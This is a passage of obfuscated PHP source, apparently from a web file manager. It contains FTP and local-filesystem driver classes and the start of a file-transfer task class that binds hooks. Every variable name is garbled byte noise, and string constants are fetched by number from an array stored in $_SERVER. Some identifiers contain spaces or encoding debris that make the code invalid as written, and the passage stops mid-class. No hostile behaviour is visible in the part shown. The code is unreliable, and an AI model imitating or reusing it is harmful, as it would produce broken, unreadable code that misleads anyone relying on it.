$this->cacheMethodInfoSet($•½®È¿ı, $¤Øù¤å, $¡ñ– ôĞ); if ($¤Øù¤å) { $”ãÄğ[] = $•½®È¿ı; if ($ŠùğÃ™) { $this->fileList($•½®È¿ı, $”ãÄğ, $éêêè®Å, $ŠùğÃ™); } continue; } $éêêè®Å[] = $¡ñ– ôĞ; } $this->cacheMethodInfoSet($ü¿úÀ¢Ú, !0); } private function _listItem($ ÈĞşİ) { if (empty($ ÈĞşİ)) { return array(); } $ÔØ…á®İ = preg_split($_SERVER[ ÇƒŠìÀ][1397], $ ÈĞşİ); if (count($ÔØ…á®İ) <= 9) { return $ÔØ…á®İ; } $ÔØ…á®İ[8] = trim(substr($ ÈĞşİ, strpos($ ÈĞşİ, $ÔØ…á®İ[7]) + strlen($ÔØ…á®İ[7]))); return array_splice($ÔØ…á®İ, 0, 9); } public function listPath($ÌšæùÛÏ, $ÆíÀ’ƒ = false) { $â´š½³İ =& $_SERVER[ ÇƒŠìÀ]; if (!$this->_isconn()) { return !1; } $ ú¯Å‡Ï = $ßÑ‘’¼ó = array(); $this->fileList($ÌšæùÛÏ, $ ú¯Å‡Ï, $ßÑ‘’¼ó); foreach ($ ú¯Å‡Ï as $ÃŠ©Øëì => $ìŞ– œ¥) { $ ú¯Å‡Ï[$ÃŠ©Øëì] = $this->folderInfo($ìŞ– œ¥, $ÆíÀ’ƒ); } foreach ($ßÑ‘’¼ó as $ÃŠ©Øëì => $ìŞ– œ¥) { $ßÑ‘’¼ó[$ÃŠ©Øëì] = $this->fileInfo($ìŞ– œ¥[$â´š½³İ[32]], $ÆíÀ’ƒ, $ìŞ– œ¥); } return array($â´š½³İ[84] => $ ú¯Å‡Ï, $â´š½³İ[85] => $ßÑ‘’¼ó); } public function has($îêŸ€Ü, $æÀ‰â¦Ò = false, $Ìç¿ü¦ƒ = true) { $Å›ğœÌ  =& $_SERVER[ ÇƒŠìÀ]; $Òö¿Ñù = $„š¼ÄÛÎ = array(); $¹ğÄµªÍ = $æÀ‰â¦Ò ? !0 : !1; $this->fileList($îêŸ€Ü, $Òö¿Ñù, $„š¼ÄÛÎ, $¹ğÄµªÍ); if ($æÀ‰â¦Ò) { return array($Å›ğœÌ [225] => count($„š¼ÄÛÎ), $Å›ğœÌ [226] => count($Òö¿Ñù)); } if ($Ìç¿ü¦ƒ) { if (count($„š¼ÄÛÎ)) { return !0; } } else { if (count($Òö¿Ñù)) { return !0; } } return !1; } public function listAll($Â‚èÆŠ¸) { $™ÜÑÛ› =& $_SERVER[ ÇƒŠìÀ]; if (!$this->_isconn()) { return !1; } $‰Ş·”“¢ = $½‰ÙÖ˜ = array(); $this->fileList($Â‚èÆŠ¸, $‰Ş·”“¢, $½‰ÙÖ˜, !0); $ œÈ”» = array_to_keyvalue($½‰ÙÖ˜, $™ÜÑÛ›[32]); foreach ($‰Ş·”“¢ as $ÕëøĞÔ) { if (is_string($ÕëøĞÔ)) { $ œÈ”»[$ÕëøĞÔ] = array($™ÜÑÛ›[78] => 0); } } return $this->listAllFiles($Â‚èÆŠ¸, $ œÈ”»); } public function getContent($Ï”³Å½) { if (!$this->_isconn()) { return !1; } $Ï”³Å½ = $this->iconvSystem($Ï”³Å½); return $this->fileSubstr($Ï”³Å½); } public function setContent($×Îñ·è–, $Å’²Àö´ = '') { if (!$this->_isconn()) { return !1; } $õª›Í¥Ë = $this->pathThis($this->iconvSystem($×Îñ·è–)); $¤Ô¯ÀÓ = $this->tempFile($õª›Í¥Ë); file_put_contents($¤Ô¯ÀÓ, $Å’²Àö´); $ÈÍí¶âò = $this->upload($×Îñ·è–, $this->iconvApp($¤Ô¯ÀÓ)); $this->tempFileRemve($¤Ô¯ÀÓ); return $ÈÍí¶âò; } public function fileSubstr($©­ÇŒÇ³, $ÉÇîœ¢° = 0, $×ÌŸ³óï = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($©­ÇŒÇ³, $ÉÇîœ¢°, $×ÌŸ³óï); } private function ftpRequest($Ìö—¹ô‹, $Å¿š’ƒ° = 0, $¦ä¸êßª = false) { $Ìö—¹ô‹ = $this->iconvSystem($Ìö—¹ô‹); $¸Ğİ‹şò = $this->scheme . $this->host . $_SERVER[ ÇƒŠìÀ][4] . $this->port; $›—ŞŞµµ = curl_init(); curl_setopt($›—ŞŞµµ, CURLOPT_URL, $¸Ğİ‹şò . $this->pathEncode($Ìö—¹ô‹)); curl_setopt($›—ŞŞµµ, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($¦ä¸êßª) { $Ê‡È É = $Å¿š’ƒ° + $¦ä¸êßª - 1; curl_setopt($›—ŞŞµµ, CURLOPT_RANGE, "{$Å¿š’ƒ°}\55{$Ê‡È É}"); } curl_setopt($›—ŞŞµµ, CURLOPT_RETURNTRANSFER, 1); $ëÆÂ®„Ö = curl_exec($›—ŞŞµµ); curl_close($›—ŞŞµµ); return $ëÆÂ®„Ö; } public function upload($ˆ…õˆ×, $¿êöíËš, $Ùİ¦İÊ¥ = false, $Şª•äìÍ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($ˆ…õˆ×))) { return !1; } $ˆ…õˆ× = $this->iconvSystem($ˆ…õˆ×); $¿êöíËš = $this->iconvSystem($¿êöíËš); $®­í“èÊ = ftp_nb_put($this->connect, $ˆ…õˆ×, $¿êöíËš, FTP_BINARY); while ($®­í“èÊ == FTP_MOREDATA) { $®­í“èÊ = ftp_nb_continue($this->connect); } if ($®­í“èÊ != FTP_FINISHED) { return !1; } return $this->getPathOuter($ˆ…õˆ×); } public function download($ßŒ·¶ø, $Û™åø¦ = '') { if (!$this->_isconn()) { return !1; } $¨œ§—æå = $this->pathFather($Û™åø¦); if (!IO::mkdir($¨œ§—æå)) { return !1; } $ßŒ·¶ø = $this->iconvSystem($ßŒ·¶ø); $Û™åø¦ = $this->iconvSystem($Û™åø¦); $ì¡í¯¯À = ftp_nb_get($this->connect, $Û™åø¦, $ßŒ·¶ø, FTP_BINARY); while ($ì¡í¯¯À == FTP_MOREDATA) { $ì¡í¯¯À = ftp_nb_continue($this->connect); } if ($ì¡í¯¯À != FTP_FINISHED) { return !1; } return $this->iconvApp($Û™åø¦); } public function exist($€£Ø«Š’) { return $this->isFile($€£Ø«Š’) || $this->isFolder($€£Ø«Š’); } public function isFile($²Å¥ÈóŞ) { return !$this->isFolder($²Å¥ÈóŞ) && $this->objectMeta($²Å¥ÈóŞ); } public function isFolder($ìÀòŠö) { return $this->cacheMethod($_SERVER[ ÇƒŠìÀ][168], $ìÀòŠö); } protected function objectMeta($˜Ï×àñÃ) { return $this->cacheMethod($_SERVER[ ÇƒŠìÀ][170], $˜Ï×àñÃ); } protected function _objectMeta($Ñ‰ùøÉ›) { $ËŞ¡Ë‰¬ =& $_SERVER[ ÇƒŠìÀ]; if ($Ñ‰ùøÉ› == $ËŞ¡Ë‰¬[12] || $Ñ‰ùøÉ› == $ËŞ¡Ë‰¬[8]) { return array(); } if (!$this->_isconn()) { return !1; } $Ñ‰ùøÉ› = $this->iconvSystem($Ñ‰ùøÉ›); $ŠÇÆ—¦– = array($ËŞ¡Ë‰¬[32] => $this->iconvApp($Ñ‰ùøÉ›), $ËŞ¡Ë‰¬[33] => $ËŞ¡Ë‰¬[216], $ËŞ¡Ë‰¬[78] => 0); @ftp_chdir($this->connect, $ËŞ¡Ë‰¬[8]); $«é‹Œ¶« = @ftp_size($this->connect, $Ñ‰ùøÉ›); if ($«é‹Œ¶« != -1) { $ŠÇÆ—¦–[$ËŞ¡Ë‰¬[78]] = $«é‹Œ¶«; } else { $¾—ˆşŞœ = @ftp_chdir($this->connect, $Ñ‰ùøÉ›); if (!$¾—ˆşŞœ) { return !1; } $ŠÇÆ—¦–[$ËŞ¡Ë‰¬[33]] = $ËŞ¡Ë‰¬[77]; } return $ŠÇÆ—¦–; } protected function _isFolder($µ¥û£íî) { $Ò–ƒµƒ± =& $_SERVER[ ÇƒŠìÀ]; if ($µ¥û£íî == $Ò–ƒµƒ±[12] || $µ¥û£íî == $Ò–ƒµƒ±[8]) { return !0; } $¬‰ô×× = $this->_objectMeta($µ¥û£íî); return isset($¬‰ô××[$Ò–ƒµƒ±[33]]) && $¬‰ô××[$Ò–ƒµƒ±[33]] == $Ò–ƒµƒ±[77] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($û¡ñÒ²ø) { if (substr($û¡ñÒ²ø, 0, 2) == $_SERVER[ ÇƒŠìÀ][1389]) { $û¡ñÒ²ø = BASIC_PATH . substr($û¡ñÒ²ø, 2); } return $û¡ñÒ²ø; } public function iconvApp($¾íº§Ã) { $Ãåó¯ÌÚ =& $_SERVER[ ÇƒŠìÀ]; global $config; return $this->iconvTo($¾íº§Ã, $config[$Ãåó¯ÌÚ[1387]], $config[$Ãåó¯ÌÚ[1386]]); } public function iconvSystem($¨ÃäÕÊ) { $•£ºÏåº =& $_SERVER[ ÇƒŠìÀ]; global $config; return $this->iconvTo($¨ÃäÕÊ, $config[$•£ºÏåº[1386]], $config[$•£ºÏåº[1387]]); } public function getPathOuter($¦Õö¥‘–) { $æ„êœö =& $_SERVER[ ÇƒŠìÀ]; $ƒò»›Î› = $this->iconvApp($this->pathBase); $¦Õö¥‘– = $this->iconvApp($¦Õö¥‘–); if (substr($ƒò»›Î›, 0, 2) == $æ„êœö[1389]) { $ƒò»›Î› = BASIC_PATH . substr($ƒò»›Î›, 2); } if (substr($¦Õö¥‘–, 0, 2) == $æ„êœö[1389]) { $¦Õö¥‘– = BASIC_PATH . substr($¦Õö¥‘–, 2); } $ƒò»›Î› = KodIO::clear($ƒò»›Î›); $¦Õö¥‘– = KodIO::clear($¦Õö¥‘–); $¦Õö¥‘– = substr($¦Õö¥‘–, strlen($ƒò»›Î›)); if (empty($this->pathDriver)) { return $¦Õö¥‘–; } return $this->pathDriver . $æ„êœö[8] . ltrim($¦Õö¥‘–, $æ„êœö[8]); } public function mkfile($ ÃÉ–İ, $€‰ªğõ· = '', $¡«ºó«ô = REPEAT_RENAME) { $ ÃÉ–İ = $this->iconvSystem($ ÃÉ–İ); @touch($ ÃÉ–İ); if ($€‰ªğõ·) { file_put_contents($ ÃÉ–İ, $€‰ªğõ·); } @chmod($ ÃÉ–İ, $this->pathAuth); return is_file($ ÃÉ–İ) ? $this->getPathOuter($ ÃÉ–İ) : !1; } public function mkdir($òéˆŠÄ, $Í‡‹’‡· = REPEAT_SKIP) { $òéˆŠÄ = $this->iconvSystem($òéˆŠÄ); if (is_dir($òéˆŠÄ)) { return $this->getPathOuter($òéˆŠÄ); } @mkdir($òéˆŠÄ, $this->pathAuth, !0); @chmod($òéˆŠÄ, $this->pathAuth); return is_dir($òéˆŠÄ) ? $this->getPathOuter($òéˆŠÄ) : !1; } public function copyFile($•Œ™³…‹, $Ö³²ÖØú) { $this->mkdir($this->pathFather($Ö³²ÖØú)); $•Œ™³…‹ = $this->iconvSystem($•Œ™³…‹); $Ö³²ÖØú = $this->iconvSystem($Ö³²ÖØú); $¾‘½ğ„ = copy_64($•Œ™³…‹, $Ö³²ÖØú); @chmod($Ö³²ÖØú, $this->pathAuth); return $¾‘½ğ„ ? $this->getPathOuter($Ö³²ÖØú) : !1; } public function moveFile($ş»æéÆß, $¬‘ÜÚÜ¤) { $this->mkdir($this->pathFather($¬‘ÜÚÜ¤)); $ş»æéÆß = $this->iconvSystem($ş»æéÆß); $¬‘ÜÚÜ¤ = $this->iconvSystem($¬‘ÜÚÜ¤); $¼¤±’ Ã = intval(@rename($ş»æéÆß, $¬‘ÜÚÜ¤)); if (!$¼¤±’ Ã) { if ($¼¤±’ Ã = intval(@copy_64($ş»æéÆß, $¬‘ÜÚÜ¤))) { @unlink($ş»æéÆß); } } @chmod($¬‘ÜÚÜ¤, $this->pathAuth); return $¼¤±’ Ã ? $this->getPathOuter($¬‘ÜÚÜ¤) : !1; } public function movePath($åÆæ´Ãß, $—Ï“òû…, $…Íõ­Ğ = false) { $ĞÂØ×Ú‡ =& $_SERVER[ ÇƒŠìÀ]; $åÆæ´Ãß = $this->iconvSystem($åÆæ´Ãß); $—Ï“òû… = $this->iconvSystem($—Ï“òû…); $âûŒ‚Óƒ = rtrim($—Ï“òû…, $ĞÂØ×Ú‡[8]) . $ĞÂØ×Ú‡[8] . ($…Íõ­Ğ ? $…Íõ­Ğ : get_path_this($åÆæ´Ãß)); if (file_exists($âûŒ‚Óƒ)) { return !1; } $Ú‹œ°” = intval(@rename($åÆæ´Ãß, $âûŒ‚Óƒ)); $Ú‹œ°” = file_exists($âûŒ‚Óƒ); return $Ú‹œ°” ? $this->getPathOuter($âûŒ‚Óƒ) : !1; } public function delFile($Æ’€›Óœ) { $Æ’€›Óœ = $this->iconvSystem($Æ’€›Óœ); if (!@unlink($Æ’€›Óœ)) { @chmod($Æ’€›Óœ, $this->pathAuth); if (!@unlink($Æ’€›Óœ)) { return !1; } } else { return !0; } } public function delFolder($ºÍÇ—è—) { $Üîâñˆ× =& $_SERVER[ ÇƒŠìÀ]; $ºÍÇ—è— = $this->iconvSystem($ºÍÇ—è—); if (!is_dir($ºÍÇ—è—)) { return !0; } if (!($¢ªŞ£Á† = opendir($ºÍÇ—è—))) { return !1; } while (($ÅÄ÷ÅĞÉ = readdir($¢ªŞ£Á†)) !== !1) { if ($ÅÄ÷ÅĞÉ == $Üîâñˆ×[10] || $ÅÄ÷ÅĞÉ == $Üîâñˆ×[1313]) { continue; } $ò×§ ïü = $ºÍÇ—è— . $Üîâñˆ×[8] . $ÅÄ÷ÅĞÉ; if (is_file($ò×§ ïü) || is_link($ò×§ ïü)) { if (!unlink($ò×§ ïü)) { chmod($ò×§ ïü, $this->pathAuth); if (!unlink($ò×§ ïü)) { return !1; } } } else { if (is_dir($ò×§ ïü)) { chmod($ò×§ ïü, $this->pathAuth); $ò×§ ïü = $this->iconvApp($ò×§ ïü); if (!$this->delFolder($ò×§ ïü)) { return !1; } } } } closedir($¢ªŞ£Á†); return rmdir($ºÍÇ—è—); } public function rename($¿›®â›, $¯Ó¼ßÓ«) { $­›ğÙ¶Ê =& $_SERVER[ ÇƒŠìÀ]; $ÜÃ‹ºÛ¡ = $this->fileNameAuto($this->pathFather($¿›®â›), $¯Ó¼ßÓ«); $ÜÃ‹ºÛ¡ = $this->iconvSystem($ÜÃ‹ºÛ¡); $¿›®â› = $this->iconvSystem($¿›®â›); $½®ıÒ»İ = $this->pathFather($¿›®â›); $ ¦Ä€‰· = rtrim($½®ıÒ»İ, $­›ğÙ¶Ê[8]) . $­›ğÙ¶Ê[8] . $ÜÃ‹ºÛ¡; $Á´Á«·ˆ = @rename($¿›®â›, $ ¦Ä€‰·); $ ¦Ä€‰· = $this->iconvApp($ ¦Ä€‰·); return $Á´Á«·ˆ ? $this->getPathOuter($ ¦Ä€‰·) : !1; } public function size($‰Á÷Œã©) { $‰Á÷Œã© = $this->iconvSystem($‰Á÷Œã©); return filesize_64($‰Á÷Œã©); } public function info($¤âùˆö¼) { $¤âùˆö¼ = $this->iconvSystem($¤âùˆö¼); if ($this->isFolder($¤âùˆö¼)) { return $this->folderInfo($¤âùˆö¼); } else { if ($this->isFile($¤âùˆö¼)) { return $this->fileInfo($¤âùˆö¼); } } return !1; } protected function infoChildren($½ÃÄæÔÇ, &$èÖ†´í, $ß°œØ¦ = true) { $ˆÏƒÆ¯¼ =& $_SERVER[ ÇƒŠìÀ]; check_abort_echo(); $½ÃÄæÔÇ = rtrim($½ÃÄæÔÇ, $ˆÏƒÆ¯¼[8]) . $ˆÏƒÆ¯¼[8]; if ($ß°œØ¦) { $½ÃÄæÔÇ = $this->iconvSystem($½ÃÄæÔÇ); } if (!($¥®ÌËÄœ = @opendir($½ÃÄæÔÇ))) { return; } while (($³¯øå¥ = readdir($¥®ÌËÄœ)) !== !1) { if ($³¯øå¥ == $ˆÏƒÆ¯¼[10] || $³¯øå¥ == $ˆÏƒÆ¯¼[1313]) { continue; } $½°«üÈè = $½ÃÄæÔÇ . $³¯øå¥; if (is_file($½°«üÈè) || is_link($½°«üÈè)) { $èÖ†´í[$ˆÏƒÆ¯¼[79]]++; $èÖ†´í[$ˆÏƒÆ¯¼[78]] += filesize_64($½°«üÈè); } else { if (is_dir($½°«üÈè)) { $èÖ†´í[$ˆÏƒÆ¯¼[80]]++; $this->infoChildren($½°«üÈè, $èÖ†´í, !1); } } } closedir($¥®ÌËÄœ); } private function folderInfo($½ıé¦“”, $¡ò˜ÊÁÈ = false) { $ì“°õ¦æ =& $_SERVER[ ÇƒŠìÀ]; $½ıé¦“” = rtrim($½ıé¦“”, $ì“°õ¦æ[8]) . $ì“°õ¦æ[8]; $çößÑİÒ = $this->iconvApp($this->pathThis($½ıé¦“”)); if ($¡ò˜ÊÁÈ) { return array($ì“°õ¦æ[32] => $çößÑİÒ, $ì“°õ¦æ[86] => $this->getPathOuter($½ıé¦“”), $ì“°õ¦æ[33] => $ì“°õ¦æ[77]); } $£¦“ÑİË = array($ì“°õ¦æ[32] => $çößÑİÒ, $ì“°õ¦æ[86] => $this->getPathOuter($½ıé¦“”), $ì“°õ¦æ[33] => $ì“°õ¦æ[77], $ì“°õ¦æ[217] => @filectime($½ıé¦“”), $ì“°õ¦æ[87] => @filemtime($½ıé¦“”), $ì“°õ¦æ[1398] => @fileatime($½ıé¦“”), $ì“°õ¦æ[1399] => is_readable($½ıé¦“”), $ì“°õ¦æ[1400] => is_writable($½ıé¦“”), $ì“°õ¦æ[1401] => get_mode($½ıé¦“”)); return $£¦“ÑİË; } private function fileInfo($ÏÓ„Áà, $ØÕûŞìõ = false) { $™¡õ»íË =& $_SERVER[ ÇƒŠìÀ]; $ÉíæŠ = $this->iconvApp($this->pathThis($ÏÓ„Áà)); if ($ØÕûŞìõ) { return array($™¡õ»íË[32] => $ÉíæŠ, $™¡õ»íË[86] => $this->getPathOuter($ÏÓ„Áà), $™¡õ»íË[33] => $™¡õ»íË[216], $™¡õ»íË[78] => $this->size($ÏÓ„Áà), $™¡õ»íË[177] => $this->ext($ÉíæŠ)); } $‘¹ƒ ó = array($™¡õ»íË[32] => $ÉíæŠ, $™¡õ»íË[86] => $this->getPathOuter($ÏÓ„Áà), $™¡õ»íË[33] => $™¡õ»íË[216], $™¡õ»íË[217] => @filectime($ÏÓ„Áà), $™¡õ»íË[87] => @filemtime($ÏÓ„Áà), $™¡õ»íË[1398] => @fileatime($ÏÓ„Áà), $™¡õ»íË[78] => $this->size($ÏÓ„Áà), $™¡õ»íË[177] => $this->ext($ÉíæŠ), $™¡õ»íË[1399] => is_readable($ÏÓ„Áà), $™¡õ»íË[1400] => is_writable($ÏÓ„Áà), $™¡õ»íË[1401] => get_mode($ÏÓ„Áà)); return $‘¹ƒ ó; } public function exist($Õû«¦êå) { $Õû«¦êå = $this->iconvSystem($Õû«¦êå); return @file_exists($Õû«¦êå); } public function isFile($¤øËüé) { $¤øËüé = $this->iconvSystem($¤øËüé); return @is_file($¤øËüé); } public function isFolder($®ğÁâŸĞ) { $®ğÁâŸĞ = $this->iconvSystem($®ğÁâŸĞ); return @is_dir($®ğÁâŸĞ); } public function listPath($¿ª¸éÎĞ, $ãß‹ÜÑ = false) { $ŒÔà¦…‹ =& $_SERVER[ ÇƒŠìÀ]; $¿ª¸éÎĞ = $this->iconvSystem($¿ª¸éÎĞ); $¿ª¸éÎĞ = rtrim($¿ª¸éÎĞ, $ŒÔà¦…‹[8]) . $ŒÔà¦…‹[8]; $ÃÔÇ›°‰ = array($ŒÔà¦…‹[84] => array(), $ŒÔà¦…‹[85] => array()); if (!($àÑØ•Ù¦ = @opendir($¿ª¸éÎĞ))) { return $ÃÔÇ›°‰; } while (($®ûÍ¨ôë = readdir($àÑØ•Ù¦)) !== !1) { if ($®ûÍ¨ôë == $ŒÔà¦…‹[10] || $®ûÍ¨ôë == $ŒÔà¦…‹[1313]) { continue; } $…ææ¯£í = $¿ª¸éÎĞ . $®ûÍ¨ôë; if (is_file($…ææ¯£í)) { $ÃÔÇ›°‰[$ŒÔà¦…‹[85]][] = $this->fileInfo($…ææ¯£í, $ãß‹ÜÑ); } else { $ÃÔÇ›°‰[$ŒÔà¦…‹[84]][] = $this->folderInfo($…ææ¯£í, $ãß‹ÜÑ); } } closedir($àÑØ•Ù¦); return $ÃÔÇ›°‰; } public function listAll($ı•À½Ë, &$ôóù‹¡§ = array()) { $òÊÆ’Èà =& $_SERVER[ ÇƒŠìÀ]; $ı•À½Ë = $this->iconvSystem($ı•À½Ë); $ı•À½Ë = rtrim($ı•À½Ë, $òÊÆ’Èà[8]) . $òÊÆ’Èà[8]; if (!($æ‰‘‹äÈ = @opendir($ı•À½Ë))) { return $ôóù‹¡§; } while (($Ş”‘Ñì¤ = readdir($æ‰‘‹äÈ)) !== !1) { if ($Ş”‘Ñì¤ == $òÊÆ’Èà[10] || $Ş”‘Ñì¤ == $òÊÆ’Èà[1313]) { continue; } $òÔÒ‘ò = $ı•À½Ë . $Ş”‘Ñì¤; $…¹é½Ùµ = is_dir($òÔÒ‘ò) && !is_link($òÔÒ‘ò) ? 1 : 0; $òÔÒ‘ò = $…¹é½Ùµ ? $òÔÒ‘ò . $òÊÆ’Èà[8] : $òÔÒ‘ò; $ôóù‹¡§[] = array($òÊÆ’Èà[86] => $òÔÒ‘ò, $òÊÆ’Èà[77] => $…¹é½Ùµ, $òÊÆ’Èà[87] => intval(@filemtime($òÔÒ‘ò)), $òÊÆ’Èà[78] => $…¹é½Ùµ ? 0 : intval($this->size($òÔÒ‘ò))); if ($…¹é½Ùµ) { $this->listAll($òÔÒ‘ò, $ôóù‹¡§); } } closedir($æ‰‘‹äÈ); return $ôóù‹¡§; } public function has($Å«íÅÒ¢, $¬§ëŒ¢Õ = false, $‹°¢ıœ£ = true) { $ë±ˆ®Ù” =& $_SERVER[ ÇƒŠìÀ]; $Å«íÅÒ¢ = $this->iconvSystem($Å«íÅÒ¢); $Å«íÅÒ¢ = rtrim($Å«íÅÒ¢, $ë±ˆ®Ù”[8]) . $ë±ˆ®Ù”[8]; if (!($Éˆë‰ºÏ = @opendir($Å«íÅÒ¢))) { return !1; } $‹‘æØü’ = 0; $‹ØìÈ»ù = 0; $”¥ØãÄ« = 0; while (($¾ÒËŞÑÂ = readdir($Éˆë‰ºÏ)) !== !1) { if ($¾ÒËŞÑÂ == $ë±ˆ®Ù”[10] || $¾ÒËŞÑÂ == $ë±ˆ®Ù”[1313]) { continue; } $µÖØş° = $Å«íÅÒ¢ . $¾ÒËŞÑÂ; if ($¬§ëŒ¢Õ) { $”¥ØãÄ«++; if (@is_file($µÖØş°)) { $‹‘æØü’++; } else { $‹ØìÈ»ù++; } if ($”¥ØãÄ« > 10000) { break; } continue; } if ($‹°¢ıœ£) { if (@is_file($µÖØş°)) { return !0; } } else { if (@is_dir($µÖØş° . $ë±ˆ®Ù”[8])) { return !0; } } } closedir($Éˆë‰ºÏ); if ($¬§ëŒ¢Õ) { return array($ë±ˆ®Ù”[225] => $‹‘æØü’, $ë±ˆ®Ù”[226] => $‹ØìÈ»ù); } return !1; } public function hashSimple($¨ˆ½ÇÆÄ) { $±¢ŠËş¦ =& $_SERVER[ ÇƒŠìÀ]; if (!$¨ˆ½ÇÆÄ) { return md5($±¢ŠËş¦[12]); } $¨ˆ½ÇÆÄ = $this->iconvSystem($¨ˆ½ÇÆÄ); $–ãÏ±ö = $this->size($¨ˆ½ÇÆÄ); $¢îâí®× = 200; $ç»–ßöÚ = 50; if ($–ãÏ±ö <= $¢îâí®× * $ç»–ßöÚ) { return $this->hashMd5($¨ˆ½ÇÆÄ) . $–ãÏ±ö; } $Ù‹Ó»ÌÔ = $±¢ŠËş¦[12]; $îù°âíì = intval($–ãÏ±ö / $ç»–ßöÚ); $øíß‘ƒ  = fopen($¨ˆ½ÇÆÄ, $±¢ŠËş¦[1402]); if (!$øíß‘ƒ ) { return $Ù‹Ó»ÌÔ; } for ($½¹“½“ = 0; $½¹“½“ < $ç»–ßöÚ; $½¹“½“++) { fseek_64($øíß‘ƒ , $îù°âíì * $½¹“½“); $Ù‹Ó»ÌÔ .= fread($øíß‘ƒ , $¢îâí®×); } fseek_64($øíß‘ƒ , $–ãÏ±ö - $¢îâí®×); $Ù‹Ó»ÌÔ .= fread($øíß‘ƒ , $¢îâí®×); fclose($øíß‘ƒ ); return md5($Ù‹Ó»ÌÔ) . $–ãÏ±ö; } public function getContent($“ÚÏµÃö) { $“ÚÏµÃö = $this->iconvSystem($“ÚÏµÃö); return file_get_contents($“ÚÏµÃö); } public function setContent($ú¾¡÷ø, $åÉÂç®ƒ = '') { $ú¾¡÷ø = $this->iconvSystem($ú¾¡÷ø); $·÷·ôƒ = @file_put_contents($ú¾¡÷ø, $åÉÂç®ƒ, LOCK_EX); clearstatcache(); @chmod($ú¾¡÷ø, $this->pathAuth); return $·÷·ôƒ === !1 ? !1 : !0; } public function fileSubstr($œ®×ÔÛÏ, $ÌÊ±¿õ‰ = 0, $×¶Àı“” = false) { $ï×‹•ÜØ =& $_SERVER[ ÇƒŠìÀ]; $œ®×ÔÛÏ = $this->iconvSystem($œ®×ÔÛÏ); if ($×¶Àı“” === !1) { $×¶Àı“” = $this->size($œ®×ÔÛÏ); } if ($×¶Àı“” <= 0) { return $ï×‹•ÜØ[12]; } $—‚ƒ‹¾ = fopen($œ®×ÔÛÏ, $ï×‹•ÜØ[1402]); if (!$—‚ƒ‹¾) { return !1; } fseek_64($—‚ƒ‹¾, $ÌÊ±¿õ‰); $×¥ŒŞÇ = fread($—‚ƒ‹¾, $×¶Àı“”); fclose($—‚ƒ‹¾); return $×¥ŒŞÇ; } public function upload($ÚşãŞÏÎ, $«÷ÅÃ£‚, $‹­¥°¢ø = false, $¹×ÄòÑª = REPEAT_REPLACE) { if ($‹­¥°¢ø) { return $this->moveFile($«÷ÅÃ£‚, $ÚşãŞÏÎ); } return $this->copyFile($«÷ÅÃ£‚, $ÚşãŞÏÎ); } public function setModifyTime($‰«ß¼‘…, $¥¤àä¸É = '') { @touch($‰«ß¼‘…, intval($¥¤àä¸É)); } public function download($Å÷·Å›Ñ, $í‡‡³»û) { return $this->iconvSystem($Å÷·Å›Ñ); } } goto BÖà­øœ¦; dæŠ„±š’: class TaskFileTransfer extends Task { protected function startAfter() { $àÇ†‡Ï° =& $_SERVER[ ÇƒŠìÀ]; $Æ¡»ê–¥ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($àÇ†‡Ï°[1719], array($this, $àÇ†‡Ï°[1720])); Hook::bind($àÇ†‡Ï°[1258], array($this, $àÇ†‡Ï°[1721])); Hook::bind($àÇ†‡Ï°[1722], array($this, $àÇ†‡Ï°[1723])); Hook::bind($àÇ†‡Ï°[638], array($this, $àÇ†‡Ï°[1724])); Hook::bind($àÇ†‡Ï°[639], array($this, $àÇ†‡Ï°[1725])); Hook::bind($àÇ†‡Ï°[645], array($this, $àÇ†‡Ï°[1726])); Hook::bind($àÇ†‡Ï°[646], array($this, $àÇ†‡Ï°[1727])); Hook::bind($àÇ†‡Ï°[641], array($this, $àÇ†‡Ï°[1728])); Hook::bind($àÇ†‡Ï°[643], array($this, $àÇ†‡Ï°[1729])); Hook::bind($àÇ†‡Ï°[607], array($this, $àÇ†‡Ï°[1730])); Hook::bind($àÇ†‡Ï°[604], array($this, $àÇ†‡Ï°[1730])); Hook::bind($àÇ†‡Ï°[609], array($this, $àÇ†‡Ï°[1730])); Hook::bind($àÇ†‡Ï°[611], array($this, $àÇ†‡Ï°[1730])); Hook::bind($àÇ†‡Ï°[613], array($this, $àÇ†‡Ï°[1730])); Hook::bind($àÇ†‡Ï°[1731], array($this, $àÇ†‡Ï°[1732])); Hook::bind($àÇ†‡Ï°[629], array($this, $àÇ†‡Ï°[1733])); $this->sourceModelCopyFlag = !1; Hook::bind($àÇ†‡Ï°[1734], array($this, $àÇ†‡Ï°[1735])); Hook::bind($àÇ†‡Ï°[1736], array($this, $àÇ†‡Ï°[1737])); Hook::bind($àÇ†‡Ï°[1738], array($this, $àÇ†‡Ï°[1739])); $Æ¡»ê–¥[$àÇ†‡Ï°[1740]] = LNG($àÇ†‡Ï°[1741]); $Æ¡»ê–¥[$àÇ†‡Ï°[1742]] = 0; $Æ¡»ê–¥[$àÇ†‡Ï°[1743]] = 0; $Æ¡»ê–¥[$àÇ†‡Ï°[1099]] = $àÇ†‡Ï°[12]; $Æ¡»ê–¥[$àÇ†‡Ï°[1744]] = $àÇ†‡Ï°[12]; $Æ¡»ê–¥[$àÇ†‡Ï°[1745]] = 0; $Æ¡»ê–¥[$àÇ†‡Ï°[1746]] = 0; $Æ¡»ê–¥[$àÇ†‡Ï°[1747]] = 0; if (!$Æ¡»ê–¥[$àÇ†‡Ï°[1579]]) { $Æ¡»ê–¥[$àÇ†‡Ï°[1579]] = LNG($àÇ†‡Ï°[1748]); } } protected function endAfter() { $ˆâÎçÎ‹ =& $_SERVER[ ÇƒŠìÀ]; Hook::unbind($ˆâÎçÎ‹[1719], array($this, $ˆâÎçÎ‹[1720])); Hook::unbind($ˆâÎçÎ‹[1258], array($this, $ˆâÎçÎ‹[1721])); Hook::unbind($ˆâÎçÎ‹[1722], array($this, $ˆâÎçÎ‹[1723])); Hook::unbind($ˆâÎçÎ‹[638], array($this, $ˆâÎçÎ‹[1724])); Hook::unbind($ˆâÎçÎ‹[639], array($this, $ˆâÎçÎ‹[1725])); Hook::unbind($ˆâÎçÎ‹[645], array($this, $ˆâÎçÎ‹[1726])); Hook::unbind($ˆâÎçÎ‹[646], array($this, $ˆâÎçÎ‹[1727])); 